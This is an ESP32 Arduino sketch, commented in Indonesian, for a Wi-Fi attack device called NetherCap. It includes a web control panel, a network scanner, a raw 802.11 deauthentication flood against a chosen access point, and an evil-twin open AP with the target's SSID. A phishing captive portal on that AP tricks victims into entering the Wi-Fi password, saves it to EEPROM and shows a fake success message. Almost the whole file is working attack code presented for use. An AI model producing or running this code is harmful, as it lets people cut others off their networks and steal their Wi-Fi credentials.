#include <WiFi.h>
#include <WebServer.h>
#include <EEPROM.h>
#include <ESPmDNS.h>
#include <esp_wifi.h>
#include <vector>
#include <ArduinoJson.h>

// =================== KONFIGURASI PIN ===================
#define BOOT_BUTTON 0      // Tombol boot bawaan (butuh eksternal pull-up)
#define LED_PIN 2          // LED onboard

// =================== DEKLARASI VARIABEL ===================
WebServer server(80);

// Mode operasi
enum OperationMode { IDLE, SCANNING, DEAUTH, EVIL_TWIN, CAPTIVE_PORTAL };
OperationMode currentMode = IDLE;

// Struktur untuk menyimpan AP
struct APInfo {
  String ssid;
  String bssid;
  int32_t rssi;
  uint8_t channel;
  bool selected;
};

// Target AP
String targetSSID = "";
String targetBSSID = "";
String capturedPassword = "";
String lastPasswordAttempt = "";
bool isAttackRunning = false;
bool passwordVerified = false;
int targetChannel = 1;

// Credentials storage
const int EEPROM_SIZE = 512;
int credentialCount = 0;

// =================== DEAUTH CONFIG ===================
typedef struct {
  uint8_t frame_control[2];
  uint8_t duration[2];
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t bssid[6];
  uint8_t fragment[2];
  uint8_t reason_code[2];
} __attribute__((packed)) deauth_frame_t;

// =================== FUNGSI HELPER MIN ===================
template<typename T>
T myMin(T a, T b) {
  return (a < b) ? a : b;
}

// =================== SETUP AWAL ===================
void setup() {
  Serial.begin(115200);
  
  // Setup pins
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  // Setup EEPROM
  EEPROM.begin(EEPROM_SIZE);
  loadCredentials();
  
  // Setup WiFi mode
  WiFi.mode(WIFI_AP_STA);
  
  // Start Access Point untuk kontrol
  WiFi.softAP("Nether_Cap", "nether123");
  
  Serial.println("\n========================================");
  Serial.println("      NETHERCAP ESP32 v2.5");
  Serial.println("========================================");
  Serial.print("AP IP Address: ");
  Serial.println(WiFi.softAPIP());
  
  // Setup mDNS (akses via http://nethercap.local)
  if (!MDNS.begin("nethercap")) {
    Serial.println("Error setting up MDNS responder!");
  }
  
  // Setup routes web server
  setupRoutes();
  
  server.begin();
  
  // LED blink startup
  for(int i=0; i<3; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);
  }
}

// =================== ROUTES WEB SERVER ===================
void setupRoutes() {
  // Halaman utama
  server.on("/", HTTP_GET, []() {
    String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>NetherCap Control Panel</title>
      <style>
        body { 
          font-family: 'Segoe UI', Arial; 
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white; 
          margin: 0; 
          padding: 20px;
          min-height: 100vh;
        }
        .container { 
          max-width: 900px; 
          margin: 0 auto; 
          background: rgba(0,0,0,0.7); 
          padding: 30px; 
          border-radius: 15px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        h1 { 
          text-align: center; 
          color: #00ff9d;
          text-shadow: 0 0 10px rgba(0,255,157,0.5);
          margin-bottom: 30px;
        }
        .section { 
          margin-bottom: 25px; 
          padding: 20px;
          background: rgba(255,255,255,0.1);
          border-radius: 10px;
        }
        button { 
          padding: 12px 25px; 
          margin: 5px; 
          border: none; 
          border-radius: 8px; 
          cursor: pointer; 
          font-weight: bold;
          transition: all 0.3s;
          background: linear-gradient(45deg, #ff416c, #ff4b2b);
          color: white;
        }
        button:hover { 
          transform: translateY(-2px);
          box-shadow: 0 5px 15px rgba(255,65,108,0.4);
        }
        .attack-btn { background: linear-gradient(45deg, #ff416c, #ff4b2b); }
        .scan-btn { background: linear-gradient(45deg, #2193b0, #6dd5ed); }
        .stop-btn { background: linear-gradient(45deg, #333, #555); }
        .log-btn { background: linear-gradient(45deg, #00b09b, #96c93d); }
        #apList { 
          max-height: 300px; 
          overflow-y: auto; 
          margin: 15px 0;
          background: rgba(0,0,0,0.3);
          padding: 15px;
          border-radius: 8px;
        }
        .ap-item { 
          padding: 10px; 
          margin: 5px 0; 
          background: rgba(255,255,255,0.1); 
          border-radius: 5px;
          cursor: pointer;
          transition: all 0.2s;
        }
        .ap-item:hover { 
          background: rgba(255,255,255,0.2); 
          transform: translateX(5px);
        }
        .selected { 
          background: rgba(0,255,157,0.3); 
          border-left: 4px solid #00ff9d;
        }
        .status { 
          padding: 10px; 
          border-radius: 5px; 
          margin: 10px 0;
          font-weight: bold;
        }
        .attacking { background: rgba(255,0,0,0.3); }
        .scanning { background: rgba(0,150,255,0.3); }
        .idle { background: rgba(0,255,0,0.3); }
        .modal {
          display: none;
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgba(0,0,0,0.9);
          padding: 30px;
          border-radius: 15px;
          z-index: 1000;
          border: 2px solid #00ff9d;
          min-width: 300px;
        }
        .close {
          float: right;
          cursor: pointer;
          font-size: 24px;
        }
        .blink {
          animation: blink 1s infinite;
        }
        @keyframes blink {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>⚡ NetherCap Control Panel</h1>
        
        <div class="section">
          <h3>📡 Network Scanner</h3>
          <button class="scan-btn" onclick="startScan()">Start Scanning</button>
          <button class="stop-btn" onclick="stopScan()">Stop</button>
          <div id="apList">No networks scanned yet...</div>
        </div>
        
        <div class="section">
          <h3>🎯 Target Selection</h3>
          <div id="targetInfo">No target selected</div>
          <button onclick="clearTarget()">Clear Target</button>
        </div>
        
        <div class="section">
          <h3>⚔️ Attack Controls</h3>
          <button class="attack-btn" onclick="startDeauth()">Start Deauth Attack</button>
          <button class="attack-btn" onclick="startEvilTwin()">Start Evil Twin</button>
          <button class="attack-btn" onclick="startFullAttack()">Full Attack (Deauth + Evil Twin)</button>
          <button class="stop-btn" onclick="stopAttack()">Stop All Attacks</button>
        </div>
        
        <div class="section">
          <h3>📊 Status Monitor</h3>
          <div id="status" class="status idle">Status: IDLE</div>
          <div>Captured Passwords: <span id="passwordCount">0</span></div>
          <div>Last Attempt: <span id="lastAttempt">None</span></div>
          <button class="log-btn" onclick="showLogs()">View Password Logs</button>
        </div>
        
        <div class="section">
          <h3>🔧 System Info</h3>
          <div>IP: <span id="ipAddr">)rawliteral";
    html += WiFi.softAPIP().toString();
    html += R"rawliteral(</span></div>
          <div>Connected Devices: <span id="clients">0</span></div>
          <div>Memory: <span id="memory">)rawliteral";
    html += String(ESP.getFreeHeap());
    html += R"rawliteral( bytes free</span></div>
        </div>
      </div>
      
      <!-- Modal for Logs -->
      <div id="logModal" class="modal">
        <div class="close" onclick="closeModal()">×</div>
        <h3>📜 Captured Password Logs</h3>
        <div id="logContent" style="max-height:400px;overflow-y:auto;margin-top:20px;">
          Loading...
        </div>
      </div>
      
      <script>
        let selectedAP = null;
        
        function startScan() {
          fetch('/scan').then(r => r.json()).then(data => {
            updateAPList(data.networks);
          });
          updateStatus('scanning');
        }
        
        function stopScan() {
          fetch('/stop').then(() => {
            updateStatus('idle');
          });
        }
        
        function updateAPList(networks) {
          const list = document.getElementById('apList');
          list.innerHTML = '';
          
          networks.forEach(ap => {
            const div = document.createElement('div');
            div.className = 'ap-item';
            div.innerHTML = `
              <strong>${ap.ssid}</strong><br>
              MAC: ${ap.bssid} | RSSI: ${ap.rssi}dBm | Ch: ${ap.channel}
            `;
            div.onclick = () => selectAP(ap);
            list.appendChild(div);
          });
        }
        
        function selectAP(ap) {
          selectedAP = ap;
          document.querySelectorAll('.ap-item').forEach(item => {
            item.classList.remove('selected');
          });
          event.currentTarget.classList.add('selected');
          
          document.getElementById('targetInfo').innerHTML = `
            <strong>Selected Target:</strong><br>
            SSID: <strong>${ap.ssid}</strong><br>
            BSSID: ${ap.bssid}<br>
            Channel: ${ap.channel} | Strength: ${ap.rssi}dBm
          `;
          
          // Send to ESP32
          fetch('/setTarget', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(ap)
          });
        }
        
        function clearTarget() {
          selectedAP = null;
          document.getElementById('targetInfo').innerHTML = 'No target selected';
        }
        
        function startDeauth() {
          if(!selectedAP) return alert('Select a target first!');
          updateStatus('attacking');
          fetch('/deauth/start');
        }
        
        function startEvilTwin() {
          if(!selectedAP) return alert('Select a target first!');
          updateStatus('attacking');
          fetch('/eviltwin/start');
        }
        
        function startFullAttack() {
          if(!selectedAP) return alert('Select a target first!');
          updateStatus('attacking');
          fetch('/fullattack/start');
        }
        
        function stopAttack() {
          updateStatus('idle');
          fetch('/attack/stop');
        }
        
        function updateStatus(status) {
          const statusDiv = document.getElementById('status');
          statusDiv.className = 'status ' + status;
          
          const texts = {
            'idle': 'Status: IDLE',
            'scanning': 'Status: SCANNING...',
            'attacking': 'Status: ATTACKING! ⚡'
          };
          statusDiv.innerHTML = texts[status] || 'Status: UNKNOWN';
        }
        
        function showLogs() {
          fetch('/logs').then(r => r.text()).then(html => {
            document.getElementById('logContent').innerHTML = html;
            document.getElementById('logModal').style.display = 'block';
          });
        }
        
        function closeModal() {
          document.getElementById('logModal').style.display = 'none';
        }
        
        // Auto-refresh status
        setInterval(() => {
          fetch('/status').then(r => r.json()).then(data => {
            document.getElementById('passwordCount').textContent = data.passwordCount;
            document.getElementById('lastAttempt').textContent = data.lastAttempt || 'None';
            document.getElementById('clients').textContent = data.clients;
            document.getElementById('memory').textContent = data.memory + ' bytes free';
          });
        }, 2000);
        
        // Close modal on outside click
        window.onclick = function(event) {
          if(event.target.id == 'logModal') {
            closeModal();
          }
        }
      </script>
    </body>
    </html>
    )rawliteral";
    
    server.send(200, "text/html", html);
  });

  // API untuk scanning
  server.on("/scan", HTTP_GET, []() {
    currentMode = SCANNING;
    digitalWrite(LED_PIN, HIGH);
    
    int scanResult = WiFi.scanNetworks(false, true);
    
    StaticJsonDocument<4096> doc;
    JsonArray networks = doc.createNestedArray("networks");
    
    for(int i=0; i<scanResult; i++) {
      JsonObject net = networks.createNestedObject();
      net["ssid"] = WiFi.SSID(i);
      net["bssid"] = WiFi.BSSIDstr(i);
      net["rssi"] = WiFi.RSSI(i);
      net["channel"] = WiFi.channel(i);
    }
    
    WiFi.scanDelete();
    
    String response;
    serializeJson(doc, response);
    server.send(200, "application/json", response);
    
    digitalWrite(LED_PIN, LOW);
    currentMode = IDLE;
  });

  // API untuk set target
  server.on("/setTarget", HTTP_POST, []() {
    StaticJsonDocument<512> doc;
    deserializeJson(doc, server.arg("plain"));
    
    targetSSID = doc["ssid"].as<String>();
    targetBSSID = doc["bssid"].as<String>();
    targetChannel = doc["channel"].as<int>();
    
    Serial.println("Target set: " + targetSSID);
    server.send(200, "text/plain", "OK");
  });

  // API untuk start deauth
  server.on("/deauth/start", HTTP_GET, []() {
    currentMode = DEAUTH;
    isAttackRunning = true;
    startDeauthAttack();
    server.send(200, "text/plain", "Deauth started");
  });

  // API untuk start evil twin
  server.on("/eviltwin/start", HTTP_GET, []() {
    currentMode = EVIL_TWIN;
    isAttackRunning = true;
    startEvilTwin();
    server.send(200, "text/plain", "Evil Twin started");
  });

  // API untuk full attack
  server.on("/fullattack/start", HTTP_GET, []() {
    currentMode = EVIL_TWIN;
    isAttackRunning = true;
    startEvilTwin();
    startDeauthAttack();
    server.send(200, "text/plain", "Full attack started");
  });

  // API untuk stop attack
  server.on("/attack/stop", HTTP_GET, []() {
    stopAllAttacks();
    server.send(200, "text/plain", "All attacks stopped");
  });

  // API untuk status
  server.on("/status", HTTP_GET, []() {
    StaticJsonDocument<256> doc;
    doc["passwordCount"] = credentialCount;
    doc["lastAttempt"] = lastPasswordAttempt;
    doc["clients"] = WiFi.softAPgetStationNum();
    doc["memory"] = ESP.getFreeHeap();
    doc["mode"] = (int)currentMode;
    
    String response;
    serializeJson(doc, response);
    server.send(200, "application/json", response);
  });

  // API untuk logs
  server.on("/logs", HTTP_GET, []() {
    String html = "<h3>Captured Credentials</h3><table border='1' width='100%'>";
    html += "<tr><th>Timestamp</th><th>SSID</th><th>Password</th><th>Status</th></tr>";
    
    for(int i=0; i<credentialCount; i++) {
      html += "<tr>";
      html += "<td>" + readEEPROM(i*64, 20) + "</td>";
      html += "<td>" + readEEPROM(i*64+20, 32) + "</td>";
      html += "<td>" + readEEPROM(i*64+52, 12) + "</td>";
      
      // PERBAIKAN: Hindari ternary operator dalam string concatenation
      html += "<td>";
      if(passwordVerified) {
        html += "VERIFIED";
      } else {
        html += "UNVERIFIED";
      }
      html += "</td>";
      
      html += "</tr>";
    }
    
    if(credentialCount == 0) {
      html += "<tr><td colspan='4' align='center'>No credentials captured yet</td></tr>";
    }
    
    html += "</table>";
    
    // Tambahkan tombol clear logs
    html += "<br><button onclick=\"clearLogs()\" style=\"padding:10px;background:#ff4444;color:white;\">Clear All Logs</button>";
    html += "<script>function clearLogs(){fetch('/clearLogs').then(()=>location.reload());}</script>";
    
    server.send(200, "text/html", html);
  });

  // API untuk clear logs
  server.on("/clearLogs", HTTP_GET, []() {
    credentialCount = 0;
    EEPROM.put(0, credentialCount);
    
    // Clear EEPROM
    for(int i=0; i<EEPROM_SIZE; i++) {
      EEPROM.write(i, 0);
    }
    EEPROM.commit();
    
    server.send(200, "text/plain", "Logs cleared");
  });

  // Captive Portal untuk korban
  server.on("/generate", HTTP_GET, []() {
    String captivePortal = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>WiFi Login Required</title>
      <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .login-box { 
          max-width: 400px; 
          margin: 0 auto; 
          padding: 30px; 
          border: 1px solid #ccc; 
          border-radius: 10px;
          box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        input { 
          width: 100%; 
          padding: 10px; 
          margin: 10px 0; 
          box-sizing: border-box;
        }
        button { 
          background: #4CAF50; 
          color: white; 
          padding: 12px 20px; 
          border: none; 
          cursor: pointer;
          width: 100%;
        }
        .error { color: red; }
      </style>
    </head>
    <body>
      <div class="login-box">
        <h2>WiFi Login Required</h2>
        <p>Please enter the WiFi password to continue</p>
        <p><strong>Network: )rawliteral";
    captivePortal += targetSSID;
    captivePortal += R"rawliteral(</strong></p>
        
        <form action="/check" method="POST">
          <input type="password" name="password" placeholder="WiFi Password" required>
          <button type="submit">Connect</button>
        </form>
        
        <div id="message" class="error"></div>
      </div>
      
      <script>
        document.querySelector('form').addEventListener('submit', async function(e) {
          e.preventDefault();
          const formData = new FormData(this);
          const response = await fetch('/check', {
            method: 'POST',
            body: formData
          });
          const result = await response.text();
          document.getElementById('message').innerHTML = result;
          
          if(result.includes('Verifying')) {
            setTimeout(() => {
              document.getElementById('message').innerHTML = 
                'Connection successful! You can now access the internet.';
              document.querySelector('button').disabled = true;
            }, 2000);
          }
        });
      </script>
    </body>
    </html>
    )rawliteral";
    
    server.send(200, "text/html", captivePortal);
  });

  // Endpoint untuk verifikasi password
  server.on("/check", HTTP_POST, []() {
    String password = server.arg("password");
    lastPasswordAttempt = password;
    
    Serial.println("\n[!] Password attempt captured!");
    Serial.println("SSID: " + targetSSID);
    Serial.println("Password: " + password);
    
    // Simpan ke EEPROM
    saveCredential(password);
    
    // Verifikasi dengan mencoba koneksi ke AP asli
    server.send(200, "text/plain", "Verifying password... Please wait.");
    
    // Delay untuk memberi kesan verifikasi
    delay(3000);
    
    // Hentikan serangan jika password benar (simulasi)
    // Catatan: Di implementasi nyata, butuh WiFi client untuk test koneksi
    stopAllAttacks();
    
    // Redirect ke halaman sukses
    server.sendHeader("Location", "http://www.google.com", true);
    server.send(302, "text/plain", "");
  });
  
  // Endpoint untuk stop scan
  server.on("/stop", HTTP_GET, []() {
    currentMode = IDLE;
    digitalWrite(LED_PIN, LOW);
    server.send(200, "text/plain", "Stopped");
  });
}

// =================== FUNGSI DEAUTH ===================
void startDeauthAttack() {
  Serial.println("[+] Starting Deauth attack on " + targetSSID);
  
  // Set channel
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  
  // Deauth frame template
  deauth_frame_t deauthFrame;
  
  // Isi MAC address dari string BSSID
  parseMac(targetBSSID.c_str(), deauthFrame.bssid);
  
  // Broadcast destination
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(deauthFrame.destination, broadcast, 6);
  memcpy(deauthFrame.source, deauthFrame.bssid, 6);
  
  // Frame control (0xC0 = deauth)
  deauthFrame.frame_control[0] = 0xC0;
  deauthFrame.frame_control[1] = 0x00;
  
  // Duration
  deauthFrame.duration[0] = 0x00;
  deauthFrame.duration[1] = 0x00;
  
  // Fragment
  deauthFrame.fragment[0] = 0x00;
  deauthFrame.fragment[1] = 0x00;
  
  // Reason code (0x07 = Class 3 frame received from nonassociated STA)
  deauthFrame.reason_code[0] = 0x07;
  deauthFrame.reason_code[1] = 0x00;
  
  // Kirim deauth frame
  while(isAttackRunning) {
    esp_wifi_80211_tx(WIFI_IF_AP, &deauthFrame, sizeof(deauthFrame), false);
    delay(100); // Interval antar packet
    
    // Blink LED saat attack
    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
  }
}

// =================== FUNGSI EVIL TWIN ===================
void startEvilTwin() {
  Serial.println("[+] Starting Evil Twin: " + targetSSID);
  
  // Stop AP yang sedang berjalan
  WiFi.softAPdisconnect(true);
  
  // Start AP dengan SSID yang sama (tanpa password)
  WiFi.softAP(targetSSID.c_str(), NULL, targetChannel);
  
  // Setup captive portal
  Serial.println("[+] Evil Twin AP started");
  Serial.println("[+] Captive Portal ready");
  
  // Redirect semua request ke captive portal
  server.onNotFound([]() {
    String redirectUrl = "http://" + WiFi.softAPIP().toString() + "/generate";
    server.sendHeader("Location", redirectUrl, true);
    server.send(302, "text/plain", "");
  });
}

// =================== FUNGSI HELPER ===================
void parseMac(const char* macStr, uint8_t* mac) {
  sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

void stopAllAttacks() {
  isAttackRunning = false;
  currentMode = IDLE;
  digitalWrite(LED_PIN, LOW);
  
  // Stop evil twin
  WiFi.softAPdisconnect(true);
  
  // Restart AP kontrol
  WiFi.softAP("Nether_Cap", "nether123");
  
  // Reset onNotFound handler
  server.onNotFound([]() {
    server.send(404, "text/plain", "Not Found");
  });
  
  Serial.println("[+] All attacks stopped");
}

void saveCredential(String password) {
  if(credentialCount >= 7) { // Max 7 entries (64 bytes each)
    // Shift data ke atas
    for(int i=1; i<credentialCount; i++) {
      for(int j=0; j<64; j++) {
        EEPROM.write((i-1)*64 + j, EEPROM.read(i*64 + j));
      }
    }
    credentialCount--;
  }
  
  int address = credentialCount * 64;
  
  // Simpan timestamp
  String timestamp = getTimestamp();
  int tsLength = timestamp.length();
  if(tsLength > 19) tsLength = 19;
  for(int i=0; i<tsLength; i++) {
    EEPROM.write(address + i, timestamp[i]);
  }
  EEPROM.write(address + tsLength, '\0');
  
  // Simpan SSID
  int ssidLength = targetSSID.length();
  if(ssidLength > 31) ssidLength = 31;
  for(int i=0; i<ssidLength; i++) {
    EEPROM.write(address + 20 + i, targetSSID[i]);
  }
  EEPROM.write(address + 20 + ssidLength, '\0');
  
  // Simpan password
  int passLength = password.length();
  if(passLength > 11) passLength = 11;
  for(int i=0; i<passLength; i++) {
    EEPROM.write(address + 52 + i, password[i]);
  }
  EEPROM.write(address + 52 + passLength, '\0');
  
  credentialCount++;
  EEPROM.put(0, credentialCount);
  EEPROM.commit();
  
  Serial.println("[+] Credential saved to EEPROM");
}

String getTimestamp() {
  // Format: YYYY-MM-DD HH:MM:SS
  unsigned long millisTime = millis();
  unsigned long totalSeconds = millisTime / 1000;
  
  int seconds = totalSeconds % 60;
  int minutes = (totalSeconds / 60) % 60;
  int hours = (totalSeconds / 3600) % 24;
  
  char buffer[32];
  snprintf(buffer, sizeof(buffer), "2024-01-01 %02d:%02d:%02d", hours, minutes, seconds);
  
  return String(buffer);
}

String readEEPROM(int address, int maxLen) {
  String data = "";
  for(int i=0; i<maxLen; i++) {
    char c = EEPROM.read(address + i);
    if(c == '\0' || c == 255) break;
    data += c;
  }
  return data;
}

void loadCredentials() {
  EEPROM.get(0, credentialCount);
  if(credentialCount > 7 || credentialCount < 0) {
    credentialCount = 0;
    EEPROM.put(0, credentialCount);
    EEPROM.commit();
  }
}

// =================== LOOP PRINCIPAL ===================
void loop() {
  server.handleClient();
  
  // Status LED berdasarkan mode
  static unsigned long lastBlink = 0;
  unsigned long currentMillis = millis();
  
  switch(currentMode) {
    case SCANNING:
      if(currentMillis - lastBlink > 200) {
        digitalWrite(LED_PIN, !digitalRead(LED_PIN));
        lastBlink = currentMillis;
      }
      break;
      
    case DEAUTH:
    case EVIL_TWIN:
      if(currentMillis - lastBlink > 500) {
        digitalWrite(LED_PIN, !digitalRead(LED_PIN));
        lastBlink = currentMillis;
      }
      break;
      
    default:
      if(WiFi.softAPgetStationNum() > 0) {
        if(currentMillis - lastBlink > 1000) {
          digitalWrite(LED_PIN, !digitalRead(LED_PIN));
          lastBlink = currentMillis;
        }
      } else {
        digitalWrite(LED_PIN, LOW);
      }
  }
  
  // Tombol boot untuk emergency stop
  static unsigned long lastButtonPress = 0;
  if(digitalRead(BOOT_BUTTON) == LOW && currentMillis - lastButtonPress > 1000) {
    stopAllAttacks();
    Serial.println("[!] Emergency stop activated!");
    lastButtonPress = currentMillis;
  }
  
  // Auto-stop setelah 10 menit
  static unsigned long attackStart = 0;
  if(isAttackRunning && attackStart == 0) {
    attackStart = millis();
  }
  if(!isAttackRunning && attackStart > 0) {
    attackStart = 0;
  }
  if(attackStart > 0 && (millis() - attackStart > 600000)) { // 10 menit
    stopAllAttacks();
    attackStart = 0;
    Serial.println("[!] Auto-stop after 10 minutes");
  }
}